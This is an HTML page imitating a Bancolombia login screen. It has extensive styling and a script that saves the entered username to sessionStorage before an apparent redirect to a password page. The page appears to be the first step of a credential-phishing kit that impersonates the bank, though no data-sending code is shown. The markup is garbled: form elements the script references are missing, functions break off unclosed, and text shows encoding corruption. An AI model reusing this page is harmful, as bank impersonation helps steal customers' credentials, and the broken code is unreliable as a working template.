<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">

    <title>Bancolombia - Ingreso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f0f2f5 0%, #e8ecf0 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            padding: 60px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #1e3a8a;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .logo::before {
            content: "â‰¡";

        }
        
        .welcome-title {
            font-size: 32px;
            font-weight: bold;
            color: #1a1a1a;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 40px;
        }
        
        .form-container {
            margin-bottom: 30px;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 18px 20px 18px 50px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            font-size: 16px;
            background: #f9fafb;
            transition: all 0.3s ease;
            outline: none;
        }
        
        .input-field:focus {
            border-color: #3b82f6;
            background: white;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .input-field.error {
            border-color: #ef4444;
        }
        
        .input-icon {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
            font-size: 16px;
        }
        
        .validation-text {
            text-align: left;
            font-size: 12px;
            color: #666;
            margin-top: 5px;
            padding-left: 5px;
        }
        
        .validation-text.error {
            color: #ef4444;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            margin-bottom: 40px;
        }
        
        .btn {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-secondary {
            background: #e5e7eb;
            color: #4b5563;
        }
        
        .btn-secondary:hover {
            background: #d1d5db;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
            color: #1a1a1a;
        }
        
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(251, 191, 36, 0.3);
        }
        
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .footer-info {
            font-size: 12px;
            color: #888;
            line-height: 1.4;
        }
        
        .footer-info div {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>

                <div id="validation-message" class="validation-text">

    <script>
        const usernameInput = document.getElementById('username');
        const continueBtn = document.getElementById('continueBtn');
        const validationMessage = document.getElementById('validation-message');
        
        usernameInput.addEventListener('input', function() {
            const value = this.value;

            if (value.length === 0) {
                this.classList.remove('error');

            window.history.back();

        function continueToNext() {
            if (usernameInput.value.length >= 8) {
                // Guardar usuario y continuar al siguiente paso
                sessionStorage.setItem('username', usernameInput.value);
                // Redirigir a la pÃ¡gina de clave principal

        }
        
        // Actualizar fecha y hora en tiempo real
        function updateDateTime() {
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            };
            const dateTimeString = now.toLocaleDateString('es-CO', options);
            document.querySelector('.footer-info div:nth-child(2)').textContent = dateTimeString;
        }
        
        // Actualizar cada segundo
        setInterval(updateDateTime, 1000);
        updateDateTime();
    </script>

</html>
